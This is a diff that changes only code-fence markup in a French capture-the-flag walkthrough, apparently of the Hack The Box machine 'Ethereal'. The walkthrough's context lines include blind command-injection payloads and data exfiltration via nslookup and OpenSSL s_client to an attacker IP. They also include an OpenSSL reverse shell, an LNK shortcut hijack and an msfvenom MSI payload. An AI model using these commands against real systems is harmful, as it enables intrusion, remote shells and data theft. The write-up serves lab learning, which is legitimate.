@@ -15,7 +15,7 @@ Abandonnez tout espoir vous qui entrez ici
 
 Un Nmap remonte des ports plutôt standard et pauvres fous que nous sommes, impossible de deviner la galère dans laquelle on est en train de se mettre :D   
 
-```plain
+```
 Nmap scan report for 10.10.10.106
 Host is up (0.15s latency).
 Not shown: 65532 filtered ports
@@ -33,7 +33,7 @@ wget --no-passive-ftp -r ftp://10.10.10.106/
 
 Ça nous donne cette arborescence (on y reviendra bientôt) :  
 
-```plain
+```
 10.10.10.106/
 ├── binaries
 │   ├── Orca.Msi
@@ -91,7 +91,7 @@ Pour terminer l'exécutable *edb143en.exe*, bien que [packé avec Armadillo](htt
 
 Je passe sur le port 80 qui est un site web avec quelques liens valides. J'utilise *Wapiti* en mode verbeux en spécifiant une liste de modules vides afin qu'il n'effectue qu'un crawling :  
 
-```plain
+```
 $ ./bin/wapiti -u http://10.10.10.106/ -m "" -v 2
 
      __      __               .__  __  .__________
@@ -177,7 +177,7 @@ Cet utilitaire se compile parfaitement (forcément, c'est basé sur *CMake*) et 
 
 A ma grande surprise c'est sur l'image FDISK que j'ai trouvé quelque chose d'intéressant :  
 
-```plain
+```
 $ ./fatcat /tmp/FDISK -d -l /PBOX
 Listing path /PBOX
 Directory cluster: 2
@@ -192,7 +192,7 @@ f 24/8/2010 20:41:54  BOX.TXT                        c=234 s=2702 (2.63867K) h d
 
 Dans le dernier fichier texte on peut lire ceci :  
 
-```plain
+```
 -=[  PasswordBox  ]=-
 
 PasswordBox is a console-mode program which will keep all your passwords safe, inside an encrypted database.
@@ -209,7 +209,7 @@ Avec *Fat Cat* on extrait l'exécutable *pbox.exe* ainsi que les mots de passes 
 
 Pour accéder à l'exécutable depuis DOSBox il faut d'abord monter son emplacement depuis l'émulateur puis se placer dedans. On en profite pour charger le clavier français car on est amené à saisir des mots de passe.  
 
-```plain
+```
 mount c .
 c:
 keyb fr
@@ -230,7 +230,7 @@ Certes si on rentre notre IP on peut observer deux messages ICMP ECHO arriver ma
 
 Cette exécution de commande distante (RCE) totalement en aveugle (aucun output ni message d'erreur) existe pourtant bien comme l'atteste la saisie suivante qui génère 12 pings vers notre machine :  
 
-```plain
+```
 10.10.14.221 & ping -n 10 10.10.14.221
 ```
 
@@ -238,13 +238,13 @@ Tenter depuis *Ethereal* d'accéder à un partage Samba sous notre contrôle éc
 
 J'ai tenté d'exécuter ce port-scanner en PowerShell histoire de connaître les ports autorisés mais rien, pas même une carte postale :(   
 
-```plain
+```
 powershell.exe -nop -exec bypass -c "1..65535 | % { (New-Object Net.Sockets.TcpClient).Connect('10.10.15.208', $_) }"
 ```
 
 En revanche on peut utiliser les spécificités du langage Batch pour tester la présence de dossiers et fichiers par exemple :  
 
-```plain
+```
 10.10.14.221 & if exist c:\inetpub ping -n 3 10.10.14.221
 ```
 
@@ -254,7 +254,7 @@ On voit aussi que *c:\users\alan* existe mais qu'il ne semble pas y avoir le fla
 
 On ne vas pas aller bien loin avec juste de l'ICMP... Il est temps de tester autre chose et c'est là qu'intervient DNS :  
 
-```plain
+```
 10.10.14.221 & nslookup test.com 10.10.14.221
 Capturing on 'tun0'
     1 0.000000000 10.10.10.106 → 10.10.14.221 DNS 71 Standard query 0x0001 PTR 221.14.10.10.in-addr.arpa
@@ -266,7 +266,7 @@ Capturing on 'tun0'
 
 Super ! On peut générer des requêtes DNS vers notre machine. On peut dès lors chaîner une commande vers *nslookup* (la première ligne est l'injection, la suite la capture réseau) :  
 
-```plain
+```
 10.10.14.221 & dir /B c:\users | nslookup - 10.10.14.221
    8 333.059294275 10.10.10.106 → 10.10.14.221 DNS 50 Standard query 0x0002 A v4.5
     9 335.055060550 10.10.10.106 → 10.10.14.221 DNS 50 Standard query 0x0003 AAAA v4.5
@@ -292,7 +292,7 @@ Tout cela est suffisant pour fouiller dans *c:\inetpub\wwwroot*. On peut même u
 
 On peut pousser encore plus loin le vice en utilisant la commande [loop](https://ss64.com/nt/for.html) et sa syntaxe bizarre pour obtenir les ports en écoute :  
 
-```plain
+```
 10.10.15.30 & FOR /F "tokens=2 skip=4" %Y IN ('netstat -a -p tcp') do nslookup %Y 10.10.15.30
 0.0.0.0:135
 0.0.0.0:3389
@@ -315,7 +315,7 @@ AAAA
 
 Idem pour la liste des process :  
 
-```plain
+```
 10.10.15.30 & FOR /F "tokens=1" %Y IN ('tasklist /NH') do nslookup %Y 10.10.15.30
 csrss.exe
 dwm.exe
@@ -332,7 +332,7 @@ WUDFHost.exe
 
 Via le listing des fichiers j'ai remarqué la présence d'un fichier *note-draft.txt* dans le bureau de Alan. Pour extraire son contenu on peut utiliser la commande suivante et incrémenter le numéro de token (pas passionnant j'avoue) :  
 
-```plain
+```
 10.10.15.30 & FOR /F "tokens=1" %Y IN (c:\users\alan\desktop\note-draft.txt) do nslookup %Y 10.10.15.30
 ```
 
@@ -347,7 +347,7 @@ Cette librairie que tout le monde déteste
 
 Durant mon exploration du système j'ai assez rapidement remarqué la présence d'un dossier OpenSSL dans *c:\Program Files (x86)* :  
 
-```plain
+```
 10.10.14.151 & dir /B c:\progra~2 | nslookup - 10.10.14.151
 OpenSSL-v1.1.0
 ```
@@ -358,25 +358,25 @@ Reste à savoir comment faire passer la commande *s\_client* d'OpenSSL sur de l'
 
 Pour pouvoir exfiltrer l'output de nos commandes avec *s\_client* et il faut pouvoir mettre son alter-ego *s\_server* en écoute. Au préalable on doit générer un certificat et une clé privée (l'option *nodes* permettant comme personne ne s'en doute de passer outre la définition d'un mot de passe pour la clé privée) :  
 
-```plain
+```
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -nodes
 ```
 
 On écoute alors sur le port UDP 53 (il faut forcer l'IPv4 car l'IPv6 est par défaut) :  
 
-```plain
+```
 sudo openssl s_server -4 -cert cert.pem -key key.pem -dtls1_2 -accept 53
 ```
 
 Via notre formulaire web on exécute le client :  
 
-```plain
+```
 10.10.14.151  & whoami | "c:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -dtls1_2 -connect 10.10.14.151:53
 ```
 
 Verbose output is verbose (on peut rajouter l'option -quiet sur notre serveur pour s'en débarrasser) :  
 
-```plain
+```
 Using default temp DH parameters
 ACCEPT
 -----BEGIN SSL SESSION PARAMETERS-----
@@ -399,7 +399,7 @@ ethereal\alan
 
 Avec cette méthode on peut ainsi récupérer la totalité du fichier *note-draft.txt* :  
 
-```plain
+```
 I've created a shortcut for VS on the Public Desktop to ensure we use the same version. Please delete any existing shortcuts and use this one instead.
 
 - Alan
@@ -409,7 +409,7 @@ J'ai découvert que l'utilisateur *Alan* ne dispose que des droits lecture et ex
 
 Peut être est-il temps de jeter un œil à ce fameux raccourci   
 
-```plain
+```
  Volume in drive C has no label.
  Volume Serial Number is FAD9-1FD5
 
@@ -422,7 +422,7 @@ Peut être est-il temps de jeter un œil à ce fameux raccourci
 
 L'analyse du lien montre la cible suivante :  
 
-```plain
+```
 D:\Program Files (x86)\Microsoft Visual Studio\2017\Community\Common7\IDE\devenv.exe
 ```
 
@@ -430,7 +430,7 @@ Avec la commande *fsutil fsinfo drives* on voit bien qu'un disque *D:* existe ma
 
 De toute évidence notre objectif est d'écraser directement le fichier LNK au vu des permissions accueillantes :  
 
-```plain
+```
 c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk NT AUTHORITY\SYSTEM:(I)(F)
                                                          ETHEREAL\rupal:(I)(D,DC)
                                                          ETHEREAL\Administrator:(I)(D,DC)
@@ -457,7 +457,7 @@ On a donc un dossier dans lequel on peut écrire et ça c'est une bonne nouvelle
 
 On arrive tout de même à extraire les règles de sortie du pare-feu avec l'option *-dtls1\_2* qui semble un peu plus fiable :  
 
-```plain
+```
 10.10.12.219 & netsh advfirewall firewall show rule name=all dir=out | findstr RemotePort | "c:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -dtls1_2 -connect 10.10.12.219:53
 RemotePort:                           53
 RemotePort:                           73,136
@@ -465,7 +465,7 @@ RemotePort:                           73,136
 
 Et la version plus exhaustive :  
 
-```plain
+```
 Rule Name:                            Allow UDP Port 53
 ----------------------------------------------------------------------
 Enabled:                              Yes
@@ -527,7 +527,7 @@ De la même façon on trouve différentes versions de MSBuild (avec la commande 
 
 On se consolera avec la possibilité d'obtenir un reverse shell interactif en exploitant ces deux ports. La technique est la même que décrite [dans cet article](https://medium.com/@honze_net/openssl-reverse-shell-with-certificate-pinning-e0955c37b4a7) mais appliqué à Windows donc :  
 
-```plain
+```
 10.10.13.187 & "c:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.13.187:136 | cmd | "c:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.13.187:73
 ```
 
@@ -611,13 +611,13 @@ Si les fichiers mentionnés n'existent pas, Windows peut refuser la création du
 
 Quand on écrase le LNK (soit en redirigeant directement l'output de *OpenSSL* vers le fichier, soit en rajoutant une étape consistant à utiliser les options *enc -base64* d'*OpenSSL*) on a comme retour le nom de notre nouvel accès (la présence d'un autre utilisateur qui cliquerait sur le raccourci est simulée) :  
 
-```plain
+```
 ethereal\jorge
 ```
 
 Cet utilisateur dispose du premier flag dans son bureau :) Et dans ses documents le script chargé de lancer le LNK et de le restaurer régulièrement :  
 
-```plain
+```
 @echo off
 
 :loop
@@ -684,7 +684,7 @@ Je m'en tirais alors avec le batch suivant :
 
 Voyant que mon MSI était traité (il disparaît du dossier d'*Ethereal* après un moment) sans être exécuté j'ai pensé que ça pouvait être lié au payload car *Windows Defender* tourne sur la machine. A tout hasard j'ai essayé avec un payload peut être moins typé mais plus générique (il suffit d'éditer le bat ciblé pour changer les commandes) .  
 
-```plain
+```
 msfvenom -a x86 -f msi --platform windows -p windows/exec CMD="d:\dev\msis\devloop.bat" -o rev.msi
 ```
 
